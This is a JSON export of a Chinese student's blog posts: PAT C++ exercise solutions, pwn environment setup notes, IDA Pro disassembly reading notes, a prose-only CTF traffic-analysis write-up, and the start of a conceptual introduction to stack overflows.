libssl-devsudo apt-get install pythonsudo apt-get install python-pippip install pwntools 其中在安装pwntools时，出现错误。解决办法：可能考虑到是python国内网络的问题，这时用国内的镜像源来加速。pip install 包名 -i http://pypi.douban.com/simple/ –trusted-host pypi.douban.com成功安装！ ！！！！安装qira成功，但是运行qira失败，配置了路径也不行，明天再试试，一直困在一个死胡同里真的容易憋死！！！！！","categories":[],"tags":[{"name":"pwn环境搭建","slug":"pwn环境搭建","permalink":"https://hanqd.github.io/tags/pwn环境搭建/"}]},{"title":"每日一题 1017（大数除法）","slug":"每日一题1017","date":"2019-04-09T01:57:02.820Z","updated":"2019-04-09T14:14:32.616Z","comments":true,"path":"2019/04/09/每日一题1017/","link":"","permalink":"https://hanqd.github.io/2019/04/09/每日一题1017/","excerpt":"1017 A除以B题目描述本题要求计算 A/B，其中 A 是不超过 1000 位的正整数，B 是 1 位正整数。你需要输出商数 Q 和余数 R，使得 A=B×Q+R 成立。","text":"1017 A除以B题目描述本题要求计算 A/B，其中 A 是不超过 1000 位的正整数，B 是 1 位正整数。你需要输出商数 Q 和余数 R，使得 A=B×Q+R 成立。 输入格式：输入在一行中依次给出 A 和 B，中间以 1 空格分隔。 输出格式：在一行中依次输出 Q 和 R，中间以 1 空格分隔。 题目分析输入样例：123456789050987654321 7 输出样例：17636684150141093474 3 这里的A是不超过1000位的正整数，超出了一般数据类型的表示范围，涉及到大整数的运算，用字符串来表示大数。这里的大数除法思想是：先用大数字符串的第一个数即是s[0]除以被除数，样例中是s[0]=1,用1/7，Q=0,R=1,再用R*10+s[1]除以7，得到商和余数，（这里为什么余数要乘以10？因为这个余数是上一个字符除以7余下的，相比较算术运算中的十位和个位，先用十位上的数除以7，余数不等于0，则在计算个位除以7时，需要加上十位余下的数，计算才正确。）以此类推，直到计算完字符串的最后一个字符。 C++代码1234567891011121314151617181920212223#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int main()&#123; string A; int B,Q=0,R=0; cin&gt;&gt;A&gt;&gt;B; Q=(A[0]-&apos;0&apos;)/B; if(A.length()==1||(A.length()&gt;0&amp;&amp;Q!=0)) &#123; cout&lt;&lt;Q; &#125; R=(A[0]-&apos;0&apos;)%B; for(int i=1;i&lt;A.length();i++) &#123; Q=((R*10)+A[i]-&apos;0&apos;)/B; cout&lt;&lt;Q; R=((R*10)+A[i]-&apos;0&apos;)%B; &#125; cout&lt;&lt;&quot; &quot;&lt;&lt;R; return 0;&#125; 大数四则运算：https://www.cnblogs.com/wuqianling/p/5387099.html各种数据类型的取值范围：https://www.cnblogs.com/fightformylife/p/4022058.htmlhttps://www.cnblogs.com/fightformylife/p/4022058.html","categories":[],"tags":[{"name":"PAT每日一题","slug":"PAT每日一题","permalink":"https://hanqd.github.io/tags/PAT每日一题/"}]},{"title":"每日一题1015（结构体+sort排序）+1016","slug":"每日一题1015 1016","date":"2019-04-08T14:13:53.116Z","updated":"2019-04-08T14:15:04.930Z","comments":true,"path":"2019/04/08/每日一题1015 1016/","link":"","permalink":"https://hanqd.github.io/2019/04/08/每日一题1015 1016/","excerpt":"1015 德才论题目描述宋代史学家司马光在《资治通鉴》中有一段著名的“德才论”：“是故才德全尽谓之圣人，才德兼亡谓之愚人，德胜才谓之君子，才胜德谓之小人。凡取人之术，苟不得圣人，君子而与之，与其得小人，不若得愚人。”","text":"1015 德才论题目描述宋代史学家司马光在《资治通鉴》中有一段著名的“德才论”：“是故才德全尽谓之圣人，才德兼亡谓之愚人，德胜才谓之君子，才胜德谓之小人。凡取人之术，苟不得圣人，君子而与之，与其得小人，不若得愚人。”现给出一批考生的德才分数，请根据司马光的理论给出录取排名。 输入格式：输入第一行给出 3 个正整数，分别为：N（≤10^5 ），即考生总数；L（≥60），为录取最低分数线，即德分和才分均不低于 L 的考生才有资格被考虑录取；H（&lt;100），为优先录取线——德分和才分均不低于此线的被定义为“才德全尽”，此类考生按德才总分从高到低排序；才分不到但德分到线的一类考生属于“德胜才”，也按总分排序，但排在第一类考生之后；德才分均低于 H，但是德分不低于才分的考生属于“才德兼亡”但尚有“德胜才”者，按总分排序，但排在第二类考生之后；其他达到最低线 L 的考生也按总分排序，但排在第三类考生之后。 随后 N 行，每行给出一位考生的信息，包括：准考证号 德分 才分，其中准考证号为 8 位整数，德才分为区间 [0, 100] 内的整数。数字间以空格分隔。 输出格式：输出第一行首先给出达到最低分数线的考生人数 M，随后 M 行，每行按照输入格式输出一位考生的信息，考生按输入中说明的规则从高到低排序。当某类考生中有多人总分相同时，按其德分降序排列；若德分也并列，则按准考证号的升序输出。 题目分析输入样例：14 60 8010000001 64 9010000002 90 6010000011 85 8010000003 85 8010000004 80 8510000005 82 7710000006 83 7610000007 90 7810000008 75 7910000009 59 9010000010 88 4510000012 80 10010000013 90 9910000014 66 60 输出样例：1210000013 90 9910000012 80 10010000003 85 8010000011 85 8010000004 80 8510000007 90 7810000006 83 7610000005 82 7710000002 90 6010000014 66 6010000008 75 7910000001 64 90 拿到题目，看到是一道比较综合的一道题目，有关联性数据的存储，要求学号和姓名对应起来，考虑用结构体解决，结构体成员包括准考证号、德分，才分。涉及到排序，考虑用sort()函数，头文件：algorithm。 在结构体中添加两个成员，flag和sum，flag是分类的标志，根据题意可以分为5类，第一类：德才都大于H，第二类：德大于H，才小于H，但是大于L，第三类：德和才都小于H，大于L，但是德大于才，第四类：在德大于L，小于H，才也大于L的情况下，德小于才第五类：德和才其中有一个小于L，即列为其他情况。sum在排序时，按从高到低排序。 2.strcmp(str1,str2)函数，字符串比较函数，设这两个字符串为str1，str2，若str1=str2，则返回零；若str1&lt;str2，则返回负数；若str1&gt;str2，则返回正数。这里return strcmp(x.a,y.a)&lt;0; 是按准考证号从小到大排序。 Sort(start,end,排序方法)，这里的排序方法是按照自己编写的cmp函数。C++代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include &lt;iostream&gt;#include &lt;string.h&gt;#include &lt;algorithm&gt;using namespace std;struct student &#123; char a[10]; int de; int cai; int sum; int flag; &#125;;student s[100001];bool cmp(student x,student y)&#123; if(x.flag!=y.flag) return x.flag&lt;y.flag; else if(x.sum!=y.sum) return x.sum&gt;y.sum; else if(x.de!=y.de) return x.de&gt;y.de; else return strcmp(x.a,y.a)&lt;0;&#125;int main()&#123; int n,L,H,count=0; cin&gt;&gt;n&gt;&gt;L&gt;&gt;H; for(int i=0;i&lt;n;i++) &#123; cin&gt;&gt;s[i].a&gt;&gt;s[i].de&gt;&gt;s[i].cai; s[i].sum=s[i].de+s[i].cai; if(s[i].de&gt;=H&amp;&amp;s[i].cai&gt;=H) &#123; count++; s[i].flag=1; &#125; else if(s[i].de&gt;=H&amp;&amp;s[i].cai&lt;H&amp;&amp;s[i].cai&gt;=L) &#123; count++; s[i].flag=2; &#125; else if(s[i].de&lt;H&amp;&amp;s[i].cai&lt;H&amp;&amp;s[i].de&gt;=s[i].cai&amp;&amp;s[i].de&gt;=L&amp;&amp;s[i].cai&gt;=L) &#123; count++; s[i].flag=3; &#125; else if(s[i].de&gt;=L&amp;&amp;s[i].de&lt;H&amp;&amp;s[i].cai&gt;=L&amp;&amp;s[i].de&lt;s[i].cai) &#123; count++; s[i].flag=4; &#125; else s[i].flag=5; &#125; sort(s,s+n,cmp); cout&lt;&lt;count&lt;&lt;endl; for(int i=0;i&lt;count;i++) &#123; cout&lt;&lt;s[i].a&lt;&lt;&quot; &quot;&lt;&lt;s[i].de&lt;&lt;&quot; &quot;&lt;&lt;s[i].cai&lt;&lt;endl; &#125; return 0;&#125; 1016 部分A+B题目描述正整数 A 的“DA （为 1 位整数）部分”定义为由 A 中所有 DA 组成的新整数 PA 。例如：给定 A=3862767，DA =6，则 A 的“6 部分”PA 是 66，因为 A 中有 2 个 6。 现给定 A、DA 、B、DB ，请编写程序计算 PA +PB 。 输入格式：输入在一行中依次给出 A、DA 、B、DB ，中间以空格分隔，其中 0&lt;A,B&lt;10^10 。 输出格式：在一行中输出 PA +PB 的值。 题目分析输入样例 1：3862767 6 13530293 3输出样例 1：399 输入样例 2：3862767 1 13530293 8输出样例 2：0 可以对A进行个位分离并进行判断 C++代码12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;using namespace std;int main()&#123; int A,Da,B,Db; cin&gt;&gt;A&gt;&gt;Da&gt;&gt;B&gt;&gt;Db; int a=0,b=0; for(int i=0;A!=0||B!=0;i++) &#123; if(A!=0) &#123; if(A%10==Da) &#123; A=A/10; a=a*10+Da; &#125; else A=A/10; &#125; if(B!=0) &#123; if(B%10==Db) &#123; B=B/10; b=b*10+Db; &#125; else B=B/10; &#125; &#125; cout&lt;&lt;a+b; return 0;&#125;","categories":[],"tags":[{"name":"PAT每日一题","slug":"PAT每日一题","permalink":"https://hanqd.github.io/tags/PAT每日一题/"}]},{"title":"IDA Pro权威指南-第一章 反汇编简介","slug":"IDA Pro学习1","date":"2019-04-07T14:23:51.140Z","updated":"2019-04-07T14:30:55.560Z","comments":true,"path":"2019/04/07/IDA Pro学习1/","link":"","permalink":"https://hanqd.github.io/2019/04/07/IDA Pro学习1/","excerpt":"反汇编简介反汇编理论编程语言分为好几代：","text":"反汇编简介反汇编理论编程语言分为好几代： 第一代语言：这些语言是最低级的语言，一般由0或1或某些简写编码（如十六进制码）组成。第一代语言称为机器语言，有时也叫做字节码，而机器语言程序常被称为二进制文件。 第二代语言：汇编语言。汇编语言会将具体的位模式或操作码，与短小且易于记忆的字符序列（即助记符）对应起来。 第三代语言：高级程序语言，即C、Java等。程序员通常使用编译器将程序转换成汇编语言，或者直接转换为机器语言（或某种大致的等价形式，如字节码）。 何为反汇编程序员使用编译器、汇编器和链接器中的一个或几个创建可执行程序。由源代码（c语言程序）到汇编语言再到机器码的过程。为了回溯编程过程（或对程序进行逆向工程），我们使用各种工具来撤销汇编和编译过程，这些工具就叫做反汇编器和反编译器。反汇编器的输入的汇编语言，输出是汇编语言形式，反编译器是以汇编语言甚至机器语言为输入，其输出结果是高级语言。 在竞争激烈的软件市场，“恢复源代码”的前景总是充满吸引力的。以下列举几个原因，说明反汇编困难重重： 编译过程会造成损失。机器语言中没有变量或函数名，变量类型信息只有通过数据的用途来确定。 编译属于多对多操作。源程序可以通过许多不同的方式转换成汇编语言，而机器语言也可以通过许多不同方式转换成源程序。 反编译器非常依赖于语言和库。 要想准确的反编译一个二进制文件，需要近乎完美的反汇编能力。 为何反汇编通常，使用反汇编工具是为了在没有源代码的情况下促进对程序的了解。需要进行反汇编的常见情况包括以下几种： 分析恶意软件 分析闭源软件的漏洞 分析闭源软件的互操作性 分析编译器生成的代码，以验证编译器的性能和准确性 在调试时显示程序指令 分析恶意软件恶意软件的作者很少会提供他们“作品”的源代码，除非你对付的是一种基于脚本的蠕虫。由于缺乏源代码，要准确的了解恶意代码的运行机制，选择非常有限。动态分析和静态分析是分析恶意软件的两种主要技术。动态分析是指在严格控制的环境（沙盒）中执行恶意软件，并使用系统检测实用工具记录其所有行为。相反，静态分析则试图通过浏览程序代码来理解程序的行为。此时，要查看的就是对恶意软件进行反汇编之后的代码。 漏洞分析将整个安全审核过程划分为3个步骤：发现漏洞、分析漏洞、开发破解程序。第一个步骤是发现程序中潜在的可供利用的条件，一般情况下，可以通过模糊测试等动态技术来达到这一目的，也可通过静态分析来实现。编译器究竟如何分配程序变量，反汇编代码清单提供了详细的信息。另外，要了解编译器到底如何对全局声明或在函数中声明的所有变量进行排序，查看反汇编代码清单是唯一的办法。在开发破解程序时，了解变量之间的这些空间关系往往非常重要。 软件互操作性如果仅以二进制形式发布一个软件，竞争对手想要创建可以和它互操作的软件，或者为该软件提供插件，将会非常困难。针对某个仅有一种平台支持的硬件而发布的驱动程序代码，就是一个常见的例子。如果厂商暂时不支持，或者更糟糕的，拒绝支持在其他平台上使用它们的硬件，那么为了开发支持硬件的软件驱动程序，可能需要完成大量的逆向工作。在这些情况下，静态代码分析几乎是唯一的补救方法。 编译器验证由于编译器（或汇编器）的用途是生成机器语言，因此优秀的反汇编工具通常需要验证编译器是否符合设计规范。除准确性外，分析人员还可以从中寻找优化编译器输出的机会，查知编译器本身是否容易被攻破，以致于可以在生成的代码中插入后门，等等。 显示调试信息在调试器中生成代码清单，可能是反汇编器最常见的一种途径。在调试过程中，为了了解详细的环境和背景信息，最好是结合使用调试器和优秀的反汇编器。 如何反汇编以上已经知道了反汇编的目的，下面是介绍如何反汇编。以反汇编器所面临的一个艰巨任务为例：对于一个100KB的文件，请区分其中的代码与数据，并把代码转换成汇编语言显示给用户，在整个过程中，不要遗漏任何信息。要求反汇编器定位函数，识别跳转表并确定局部变量，这进一步增加了反汇编器工作的难度。为了满足所有要求，反汇编器必须从大量算法中选择一些适当的算法，来处理我们提供的文件。 基本的反汇编算法首先开发一个以机器语言为输入、以汇编语言为输出的简单算法。 第一步。确定进行反汇编的代码区域。通常，指令与数据混杂在一起，区分它们就显得非常重要。以最常见的情形——反汇编可执行文件为例，该文件必须符合可执行文件的某种通用格式，如Windows所用的可移植可执行（PE）格式或许多UNIX系统常用的可执行和链接格式（ELF）。这些格式通常含有一种机制，用来确定文件中包含代码和代码入口点的部分的位置（通常变现为层级文件头的形式）。 第二步。知道指令的起始地址后，下一步就是读取该地址（或文件偏移量）所包含的值，并执行一次表查找，将二进制操作码的值与它的汇编语言助记符对应起来。 第三步。获取指令并解码任何所需的操作数后，需要对它的汇编语言等价形式进行格式化，并将其在反汇编代码中输出。 第四步。输出一条指令后，继续反汇编下一条指令，并重复上述过程，直到反汇编完文件中的所有指令。 有大量算法可以用于确定从何处开始反汇编、如何选择下一条反汇编的指令、如何区分代码与数据，以及如何确定何时完成对最后一条指令的反汇编。线性扫描和递归下降是两种最主要的反汇编算法。 线性扫描反汇编线性扫描反汇编算法采用一种非常直接的方法来确定反汇编的指令的位置：一条指令结束、另一条指令开始的地方。确定起始位置的常用解决办法是，假设程序中标注为代码（通常由程序文件的头部指定）的节所包含的全部是机器语言指令。反汇编从一个代码段的第一个字节开始，以线性模式扫描整个代码段，逐条反汇编每条指令，直到完成整个代码段。这种算法并不会通过识别分支等非线性指令来了解程序的控制流。 线性扫描算法的主要优点在于：它能够完全覆盖程序的所有代码段。主要缺点是：没有考虑到代码中可能混有数据。 GNU调试器（gdb）、微软公司的WinDug调试器和objdump实用工具的反汇编引擎均采用线性扫描算法。 递归下降反汇编递归下降采用另外一种不同的方法来定位指令。递归下降算法重视控制流的概念。控制流根据一条指令是否被另一条引用来决定是否对其进行反汇编。为了便于理解递归下降，根据指令对CPU指令指针的影响对他们进行分类。 顺序流指令顺序流指令将执行权传递给紧随其后的下一条指令。如add、mov、push和pop。 条件分支指令条件分支指令提供两条可能的执行路径。如果条件为真，则执行分支，并且必须修改指令指针，使其指向分支的目标。但是，如果条件为假，则继续以线性模式执行指令，并使用线性扫描方法反汇编下一条指令。 无条件分支指令无条件分支并不遵循线性流模式。与顺序流指令一样，执行权只能传递给一条指令，但那条指令不需要紧接在分支指令后面。 函数调用指令函数调用指令的运行方式与无条件跳转指令非常相似，唯一不同在于，一旦函数完成，执行权将返回给紧跟在调用指令后面的指令。从被调用函数返回时，如果程序的运行出现异常，递归下降就有可能失败。5.返回指令有时，递归下降算法访问了所有路径，而且，函数返回指令没有提供接下来要执行的指令的信息。这时，递归下降反汇编器会转而处理前面搁置在一旁的延迟反汇编地址列表。反汇编器从这个列表中取出一个地址，并从这个地址开始继续反汇编过程。 递归下降算法的一个主要优点在于：它具有区分代码与数据的强大能力。主要缺点是：它无法处理间接代码路径，例如利用指针表来查找目标地址的跳转和调用。IDA Pro 是一种典型的递归下降反汇编器。","categories":[],"tags":[{"name":"IDA Pro学习","slug":"IDA-Pro学习","permalink":"https://hanqd.github.io/tags/IDA-Pro学习/"}]},{"title":"每日一题 1014","slug":"每日一题1014","date":"2019-04-06T12:08:36.704Z","updated":"2019-04-06T12:55:15.180Z","comments":true,"path":"2019/04/06/每日一题1014/","link":"","permalink":"https://hanqd.github.io/2019/04/06/每日一题1014/","excerpt":"1014 福尔摩斯的约会题目描述大侦探福尔摩斯接到一张奇怪的字条：我们约会吧！ 3485djDkxh4hhGE 2984akDfkkkkggEdsb s&amp;hgsfdk d&amp;Hyscvnm。","text":"1014 福尔摩斯的约会题目描述大侦探福尔摩斯接到一张奇怪的字条：我们约会吧！ 3485djDkxh4hhGE 2984akDfkkkkggEdsb s&amp;hgsfdk d&amp;Hyscvnm。大侦探很快就明白了，字条上奇怪的乱码实际上就是约会的时间星期四 14:04，因为前面两字符串中第 1 对相同的大写英文字母（大小写有区分）是第 4 个字母 D，代表星期四；第 2 对相同的字符是 E ，那是第 5 个英文字母，代表一天里的第 14 个钟头（于是一天的 0 点到 23 点由数字 0 到 9、以及大写字母 A 到 N 表示）；后面两字符串第 1 对相同的英文字母 s 出现在第 4 个位置（从 0 开始计数）上，代表第 4 分钟。现给定两对字符串，请帮助福尔摩斯解码得到约会的时间。 输入格式：输入在 4 行中分别给出 4 个非空、不包含空格、且长度不超过 60 的字符串。 输出格式：在一行中输出约会的时间，格式为 DAY HH:MM，其中 DAY 是某星期的 3 字符缩写，即 MON 表示星期一，TUE 表示星期二，WED 表示星期三，THU 表示星期四，FRI 表示星期五，SAT 表示星期六，SUN 表示星期日。题目输入保证每个测试存在唯一解。 题目分析输入样例：12343485djDkxh4hhGE 2984akDfkkkkggEdsb s&amp;hgsfdk d&amp;Hyscvnm 输出样例：1THU 14:04 前面两字符串中第 1 对相同的大写英文字母（大小写有区分）是第 4 个字母 D，代表星期四；这里第四是相对于26个字母来说，D在第四。说明大写字母I所在位置第几就是星期几，用I-A+1来表示。 第 2 对相同的字符是 E ，那是第 5 个英文字母，代表一天里的第 14 个钟头（于是一天的 0 点到 23 点由数字 0 到 9、以及大写字母 A 到 N 表示）；注意：这里第一对相同的字符是8，而给出的样例是E，说明这里相同的字符要在第一个条件之后出现才行。0到9点的表示：当前数字-0，在前面要加0，两位数，10到23点的表示方法：I-A+10. 后面两字符串第 1 对相同的英文字母 s 出现在第 4 个位置（从 0 开始计数）上，代表第 4 分钟。相同的字母（大小写都可以）出现的位置，这里是相对于字符串来讲，即第几分钟，小于10的，要在前面加0。 注意：两个字符串中相同位置具有相同字母的对数不止两对，所以在确定小时后一定要跳出循环，不然后面还可能又有一对满足第二个条件的，这就错误了，有一个测试点的陷阱就在这里。 C++代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;void week(int n)&#123; switch(n) &#123; case 1:cout&lt;&lt;&quot;MON&quot;&lt;&lt;&apos; &apos;;break; case 2:cout&lt;&lt;&quot;TUE&quot;&lt;&lt;&apos; &apos;;break; case 3:cout&lt;&lt;&quot;WED&quot;&lt;&lt;&apos; &apos;;break; case 4:cout&lt;&lt;&quot;THU&quot;&lt;&lt;&apos; &apos;;break; case 5:cout&lt;&lt;&quot;FRI&quot;&lt;&lt;&apos; &apos;;break; case 6:cout&lt;&lt;&quot;SAT&quot;&lt;&lt;&apos; &apos;;break; case 7:cout&lt;&lt;&quot;SUN&quot;&lt;&lt;&apos; &apos;;break; &#125;&#125;int main()&#123; string s1,s2,s3,s4; cin&gt;&gt;s1&gt;&gt;s2&gt;&gt;s3&gt;&gt;s4; int i=0; bool flag=false; while(s1.length()&gt;i&amp;&amp;s2.length()&gt;i) &#123; if(s1[i]==s2[i]) &#123; if(flag) &#123; if(s1[i]&gt;=&apos;0&apos;&amp;&amp;s1[i]&lt;=&apos;9&apos;) &#123; cout&lt;&lt;&apos;0&apos;&lt;&lt;s1[i]-&apos;0&apos;&lt;&lt;&quot;:&quot;; break; &#125; else if(s1[i]&gt;=&apos;A&apos;&amp;&amp;s1[i]&lt;=&apos;N&apos;) &#123; cout&lt;&lt;s1[i]-&apos;A&apos;+10&lt;&lt;&quot;:&quot;; break; &#125; &#125; if(!flag&amp;&amp;s1[i]&gt;=&apos;A&apos;&amp;&amp;s1[i]&lt;=&apos;G&apos;) &#123; int n=s1[i]-&apos;A&apos;+1; week(n); flag=true; &#125; &#125; i++; &#125; i=0; while(s3.length()&gt;i&amp;&amp;s4.length()&gt;i) &#123; if(s3[i]==s4[i]&amp;&amp;(s3[i]&gt;=&apos;A&apos;&amp;&amp;s3[i]&lt;=&apos;Z&apos;||s3[i]&gt;=&apos;a&apos;&amp;&amp;s3[i]&lt;=&apos;z&apos;)) &#123; if(i&lt;10) cout&lt;&lt;0; cout&lt;&lt;i; break; &#125; i++; &#125; return 0;&#125;","categories":[],"tags":[{"name":"PAT每日一题","slug":"PAT每日一题","permalink":"https://hanqd.github.io/tags/PAT每日一题/"}]},{"title":"每日一题 1011+1012+1013","slug":"每日一题1011 1012 1013","date":"2019-04-05T13:49:11.990Z","updated":"2019-04-05T13:50:22.517Z","comments":true,"path":"2019/04/05/每日一题1011 1012 1013/","link":"","permalink":"https://hanqd.github.io/2019/04/05/每日一题1011 1012 1013/","excerpt":"把之前落下的题目补上。每日一题不能断！","text":"把之前落下的题目补上。每日一题不能断！ 1011 A+B 和 C题目描述给定区间 [−2^31,2^31] 内的 3 个整数 A、B 和 C，请判断 A+B 是否大于 C。 输入格式：输入第 1 行给出正整数 T (≤10)，是测试用例的个数。随后给出 T 组测试用例，每组占一行，顺序给出 A、B 和 C。整数间以空格分隔。 输出格式：对每组测试用例，在一行中输出 Case #X: true 如果 A+B&gt;C，否则输出 Case #X: false，其中 X 是测试用例的编号（从 1 开始）。 题目分析输入样例：41 2 32 3 42147483647 0 21474836460 -2147483648 -2147483647 输出样例：Case #1: falseCase #2: trueCase #3: trueCase #4: false 根据样例，可以用做个for循环输入三个数，在循环里做判断，注意输出格式。这里注意数据范围，a和b是int型的取值范围【-2^31-2^31-1】，但是两个数相加不一定是int型，可能超出整数型范围，所以声明变量时注意！（我第一遍都是用的int型，答案部分正确，后来改为double型，答案正确。） C++代码123456789101112131415#include &lt;iostream&gt;using namespace std;int main()&#123; int T; double a,b,c; cin&gt;&gt;T; for(int i=0;i&lt;T;i++) &#123; cin&gt;&gt;a&gt;&gt;b&gt;&gt;c; if(a+b&gt;c) cout&lt;&lt;&quot;Case #&quot;&lt;&lt;i+1&lt;&lt;&quot;: true&quot;&lt;&lt;endl; else cout&lt;&lt;&quot;Case #&quot;&lt;&lt;i+1&lt;&lt;&quot;: false&quot;&lt;&lt;endl; &#125; return 0;&#125; 1012 数字分类题目描述给定一系列正整数，请按要求对数字进行分类，并输出以下 5 个数字： A1 = 能被 5 整除的数字中所有偶数的和；A2 = 将被 5 除后余 1 的数字按给出顺序进行交错求和，即计算 n1 −n2 +n3 −n4 ⋯；A3 = 被 5 除后余 2 的数字的个数；A4 = 被 5 除后余 3 的数字的平均数，精确到小数点后 1 位；A5 = 被 5 除后余 4 的数字中最大数字。 输入格式：每个输入包含 1 个测试用例。每个测试用例先给出一个不超过 1000 的正整数 N，随后给出 N 个不超过 1000 的待分类的正整数。数字间以空格分隔。 输出格式：对给定的 N 个正整数，按题目要求计算 A1 ~A5 并在一行中顺序输出。数字间以空格分隔，但行末不得有多余空格。 若其中某一类数字不存在，则在相应位置输出 N。 题目分析输入样例 1：13 1 2 3 4 5 6 7 8 9 10 20 16 18输出样例 1：30 11 2 9.7 9 输入样例 2：8 1 2 4 5 6 7 9 16输出样例 2：N 11 2 N 9 这是一道条件题，只要细心一点就能AC，这里注意A2可能为0，可以用一个变量记录是否有对5求余后为1的值。 C++代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include &lt;iostream&gt;#include &lt;iomanip&gt;using namespace std;int main()&#123; int n; cin&gt;&gt;n; int a[n+1]; int sum1=0,sum2=0,sum3=0,k=1,max=0; int A2=0,A3=0,A4=0,A5=0; for(int i=0;i&lt;n;i++) &#123; cin&gt;&gt;a[i]; &#125; for(int i=0;i&lt;n;i++) &#123; if(a[i]%5==0&amp;&amp;a[i]%2==0) &#123; sum1+=a[i]; &#125; else if(a[i]%5==1) &#123; sum2+=a[i]*k; k=-k; A2++; &#125; else if(a[i]%5==2) &#123; A3++; &#125; if(a[i]%5==3) &#123; sum3+=a[i]; A4++; &#125; if(a[i]%5==4) &#123; if(a[i]&gt;max) max=a[i]; A5++; &#125; &#125; if(sum1&gt;0) cout&lt;&lt;sum1; else cout&lt;&lt;&quot;N&quot;; if(A2&gt;0) cout&lt;&lt;&quot; &quot;&lt;&lt;sum2; else cout&lt;&lt;&quot; N&quot;; if(A3&gt;0) cout&lt;&lt;&quot; &quot;&lt;&lt;A3; else cout&lt;&lt;&quot; N&quot;; if(A4&gt;0) cout&lt;&lt;&apos; &apos;&lt;&lt;setiosflags(ios::fixed)&lt;&lt;setprecision(1)&lt;&lt;sum3*1.0/A4; else cout&lt;&lt;&quot; N&quot;; if(max&gt;0) cout&lt;&lt;&quot; &quot;&lt;&lt;max; else cout&lt;&lt;&quot; N&quot;; return 0;&#125; 1013 数素数题目描述令 Pi 表示第 i 个素数。现任给两个正整数 M≤N≤10^4 ，请输出 PM 到 PN 的所有素数。 输入格式：输入在一行中给出 M 和 N，其间以空格分隔。 输出格式：输出从 PM 到 PN 的所有素数，每 10 个数字占 1 行，其间以空格分隔，但行末不得有多余空格。 题目分析输入样例：5 27输出样例：11 13 17 19 23 29 31 37 41 4347 53 59 61 67 71 73 79 83 8997 101 103 先判断输入的数是否是素数，并计数，判断与m和n的大小，注意一下输出格式就行了。 C++代码123456789101112131415161718192021222324252627282930#include &lt;iostream&gt;#include &lt;cmath&gt;using namespace std;int main()&#123; int m,n,i=2,count=0; bool isPrime; cin&gt;&gt;m&gt;&gt;n; while(count!=n) &#123; isPrime=true; for(int j=2;j&lt;=sqrt(i);j++) &#123; if(i%j==0) &#123; isPrime=false; break; &#125; &#125; if(isPrime) &#123; count++; if(count&gt;=m&amp;&amp;count&lt;n&amp;&amp;((count-m+1)%10!=0)) cout&lt;&lt;i&lt;&lt;&quot; &quot;; if(count&gt;=m&amp;&amp;count&lt;n&amp;&amp;((count-m+1)%10==0)) cout&lt;&lt;i&lt;&lt;endl; if(count==n) cout&lt;&lt;i; &#125; i++; &#125; return 0;&#125;","categories":[],"tags":[]},{"title":"Misc shell","slug":"Misc shell","date":"2019-04-04T14:58:37.561Z","updated":"2019-04-04T14:59:54.243Z","comments":true,"path":"2019/04/04/Misc shell/","link":"","permalink":"https://hanqd.github.io/2019/04/04/Misc shell/","excerpt":"Misc shell题目描述流量分析。如果你解不出flag，请先查看整个流量，搞清楚网络中的两台主机之间发生了什么。","text":"Misc shell题目描述流量分析。如果你解不出flag，请先查看整个流量，搞清楚网络中的两台主机之间发生了什么。 题目分析根据题目提示，是一道流量分析题，用wireshark打开文件，如下题目提示，查看整个流量，那么通过过滤协议，一条条分析协议的方法是不对的，可以用跟踪数据流的方法，查看两台主机之间发生了什么。 跟踪http流：鼠标放在http协议上，右键-》追踪流-》http流，无可疑信息。 跟踪tcp流：方法同上，发现有flag.txt和base64字样，再往下看，有一串可疑字符串（猜测使用base64编码过的）。 Python中的swapcase()函数是对字符串的大小写进行转换。分析这个字符串是先进行base64编码，再对编码后的字符串进行大小写转换，逆过程即可得到flag。 对字符串进行大小写转换 对转换后的字符串base64解码","categories":[],"tags":[]},{"title":"每日一题 1010","slug":"每日一题1010","date":"2019-04-02T13:34:31.137Z","updated":"2019-04-02T13:35:25.877Z","comments":true,"path":"2019/04/02/每日一题1010/","link":"","permalink":"https://hanqd.github.io/2019/04/02/每日一题1010/","excerpt":"1010 一元多项式求导题目描述设计函数求一元多项式的导数。（注：x^n（n为整数）的一阶导数为nx^n−1 。）","text":"1010 一元多项式求导题目描述设计函数求一元多项式的导数。（注：x^n（n为整数）的一阶导数为nx^n−1 。） 输入格式:以指数递降方式输入多项式非零项系数和指数（绝对值均为不超过 1000 的整数）。数字间以空格分隔。 输出格式:以与输入相同的格式输出导数多项式非零项的系数和指数。数字间以空格分隔，但结尾不能有多余空格。注意“零多项式”的指数和系数都是 0，但是表示为 0 0。 题目分析可以一组一组的输出，系数和指数分组输出。注意输出格式，结尾不能有多余的空格，可以先输出一组，在输出其他。 C++代码123456789101112131415161718192021222324#include &lt;iostream&gt;using namespace std;int main()&#123; int m,n; int flag=1; while(cin&gt;&gt;m&gt;&gt;n) &#123; if(n&gt;0) &#123; if(flag==1) &#123; cout&lt;&lt;m*n&lt;&lt;&quot; &quot;&lt;&lt;n-1; flag=0; &#125; else &#123; cout&lt;&lt;&quot; &quot;&lt;&lt;m*n&lt;&lt;&quot; &quot;&lt;&lt;n-1; &#125; &#125; &#125; if(flag==1) cout&lt;&lt;&quot;0 0&quot;; return 0;&#125;","categories":[],"tags":[]},{"title":"pwn-栈溢出（1）","slug":"20190402","date":"2019-04-02T12:10:40.857Z","updated":"2019-04-02T12:11:40.676Z","comments":true,"path":"2019/04/02/20190402/","link":"","permalink":"https://hanqd.github.io/2019/04/02/20190402/","excerpt":"栈溢出简介计算机程序的运行依赖于函数调用栈。栈溢出是指在栈内写入超出长度限制的数据，从而破坏程序运行甚至获得系统控制权的攻击手段。为了实现栈溢出，要满足两个条件。","text":"栈溢出简介计算机程序的运行依赖于函数调用栈。栈溢出是指在栈内写入超出长度限制的数据，从而破坏程序运行甚至获得系统控制权的攻击手段。为了实现栈溢出，要满足两个条件。 第一，程序要有向栈内写入数据的行为； 第二，程序并不限制写入数据的长度。 历史上第一例被广泛注意的“莫里斯蠕虫”病毒就是利用C语言标准库的 gets() 函数并未限制输入数据长度的漏洞，从而实现了栈溢出。 